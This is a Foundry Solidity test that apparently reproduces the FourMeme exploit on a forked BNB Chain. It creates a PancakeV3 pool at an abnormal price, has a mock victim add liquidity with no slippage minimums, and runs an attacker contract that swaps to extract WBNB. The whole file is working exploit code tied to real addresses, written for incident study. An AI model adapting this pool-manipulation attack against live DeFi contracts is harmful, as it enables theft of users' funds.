pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import {IERC20} from "../../interfaces/IERC20.sol";
import {IFourMemeToken} from "./IFourMemeToken.sol";

import {INonfungiblePositionManager} from "../../utils/IPancakeV3NonfungiblePositionManager.sol";
import {IPancakeV3Factory} from "../../utils/IPancakeV3Factory.sol";
import {IPancakeV3Pool} from "../../utils/IPancakeV3Pool.sol";
import {IPancakeV3SwapCallback} from "../../utils/IPancakeV3SwapCallback.sol";

contract Exploit_FourMeme is TestHarness, TokenBalanceTracker {
    INonfungiblePositionManager internal pancakePositionManager =
        INonfungiblePositionManager(0x46A15B0b27311cedF172AB29E4f4766fbE7F4364);
    IPancakeV3Factory internal pancakeFactory = IPancakeV3Factory(0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865);

    address internal attackerAddress = 0x010Fc97CB0a4D101dCe20DAB37361514bD59A53A;
    address internal attackerAddressWithSnowboard = 0x4FdEBcA823b7886c3A69fA5fC014104F646D9591;

    address internal victimContractWithSnowboard = 0x5c952063c7fc8610FFDB798152D69F0B9550762b;

    IFourMemeToken internal snowboard = IFourMemeToken(0x4AbfD9a204344bd81A276C075ef89412C9FD2f64);
    IERC20 internal WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    address snowWBNBPoolAddress;

    function setUp() external {
        // We pin one block before the exploit process began
        cheat.createSelectFork(vm.envString("RPC_URL"), 46_555_724);

        // The attacker started with some BNBs
        cheat.deal(address(this), attackerAddress.balance);

        // Balance tracking
        addTokenToTracker(address(snowboard));
        addTokenToTracker(address(WBNB));
        updateBalanceTracker(address(this));
    }

    function createAbnormalPricePool() internal {
        console.log("-- Attacker initializes malicious pool --");
        console.log("");
        address poolAddress = pancakePositionManager.createAndInitializePoolIfNecessary(
            address(snowboard), address(WBNB), 10_000, 10_000_000_000_000_000_000_000_000_000_000_000_000
        );
        // Attacker used 10_000_000_000_000_000_000_000_000_000_000_000_000_000

        console.log("Malicious pool address: ");
        console.log(poolAddress);
        console.log("");
    }

    function deployLiquidityUnchecked() internal {
        // Create victim contract
        VictimMock victim = new VictimMock();
        updateBalanceTracker(address(victim));

        // Get victim the BNBs needed to deposit into the pool
        cheat.deal(address(victim), 23_519_999_999_451_199_994); // ~23.5 BNBs

        // Set SNOWBOARD as MODE_NORMAL and get victim the SNOWBOARD needed to deposit into the pool
        vm.startPrank(victimContractWithSnowboard);
        snowboard.setMode(0);
        snowboard.transfer(address(victim), snowboard.balanceOf(victimContractWithSnowboard));
        vm.stopPrank();

        snowWBNBPoolAddress = pancakeFactory.getPool(address(snowboard), address(WBNB), 10_000);
        updateBalanceTracker(snowWBNBPoolAddress);
        logBalancesWithLabel("victim before liquidity provision", address(victim));
        logBalancesWithLabel("snowWBNBPool before liquidity provision", snowWBNBPoolAddress);
        // Deploy liquidity

        console.log("-- Victim deploys liquidity into malicious pool --");
        console.log("");
        victim.deployLiquidity(pancakePositionManager, snowboard, WBNB);

        logBalancesWithLabel("victim after liquidity provision", address(victim));
        logBalancesWithLabel("snowWBNBPool after liquidity provision", snowWBNBPoolAddress);
    }

    function sellTokensAndProfit() internal {
        AttackerContract attackerContract = new AttackerContract();

        // Transfer the SNOWBOARD balance the attacker had at the moment of the attack
        vm.startPrank(attackerAddressWithSnowboard);
        snowboard.transfer(address(attackerContract), snowboard.balanceOf(attackerAddressWithSnowboard));
        vm.stopPrank();

        updateBalanceTracker(address(attackerContract));
        logBalancesWithLabel("attackerContract before swap", address(attackerContract));

        console.log("-- attackerContract swaps tokens --");
        console.log("");
        attackerContract.swapTokens(pancakeFactory, address(snowboard), address(WBNB));

        logBalancesWithLabel("attackerContract after swap", address(attackerContract));
        logBalancesWithLabel("snowWBNBPool after swap", snowWBNBPoolAddress);
    }

    function test_attack() external {
        console.log("------- Step 1: Create abnormal price pool -------");
        console.log("");
        createAbnormalPricePool();

        console.log("------- Step 2: Deploy liquidity without establishing expected minimums -------");
        console.log("");

        cheat.rollFork(46_555_730); // Liquidity deployment block - 1
        deployLiquidityUnchecked();

        console.log("------- Step 3: Sell tokens and profit -------");
        console.log("");
        cheat.rollFork(46_555_731); // Tokens sale block - 1
        sellTokensAndProfit();

        assertEq(true, true);
    }
}

contract VictimMock {
    function deployLiquidity(
        INonfungiblePositionManager pancakePositionManager,
        IERC20 snowboard,
        IERC20 wbnb
    ) public {
        // Create the pool with victim's target price
        pancakePositionManager.createAndInitializePoolIfNecessary(
            address(snowboard), address(wbnb), 10_000, 27_169_599_998_237_907_265_358_521
        );
        snowboard.approve(address(pancakePositionManager), 200_000_000_000_000_000_000_000_000);

        // Deploy liquidity (200M SNOWBOARD, 23.5 BNB)
        INonfungiblePositionManager.MintParams memory mintParams = INonfungiblePositionManager.MintParams({
            token0: address(snowboard),
            token1: address(wbnb),
            fee: 10_000,
            tickLower: -887_200,
            tickUpper: 887_200,
            amount0Desired: 200_000_000_000_000_000_000_000_000,
            amount1Desired: 23_519_999_999_451_199_994,
            amount0Min: 0, // HERE IS THE BUG!! No slippage checks
            amount1Min: 0, // HERE IS THE BUG!! No slippage checks
            recipient: address(this), // Mint the NFT to self, don't care
            deadline: 1_739_248_654
        });
        pancakePositionManager.mint{value: address(this).balance}(mintParams);
    }
}

contract AttackerContract is IPancakeV3SwapCallback {
    address snowWBNBPoolAddress;

    function swapTokens(IPancakeV3Factory pancakeFactory, address t0, address t1) external /* onlyOwner */ {
        snowWBNBPoolAddress = pancakeFactory.getPool(t0, t1, 10_000);

        IPancakeV3Pool(snowWBNBPoolAddress).swap(
            address(this),
            true,
            330_000,
            // Attacker used 1_603_243_002_223_000_000_000 (entire balance held in an account)
            4_295_128_740,
            // Attacker used 4_295_128_740_000_000 as price limit
            ""
        );
    }

    function pancakeV3SwapCallback(int256 amount0Delta, int256 _amount1Delta, bytes calldata _data)
        external
        override
    {
        _amount1Delta;
        _data;
        require(msg.sender == snowWBNBPoolAddress, "Only target pool"); // Prevent abuse of this callback

        IERC20 snowboard = IERC20(IPancakeV3Pool(msg.sender).token0());
        snowboard.transfer(msg.sender, uint256(amount0Delta));

        snowWBNBPoolAddress = address(0); // Prevent abuse of this callback
    }
}
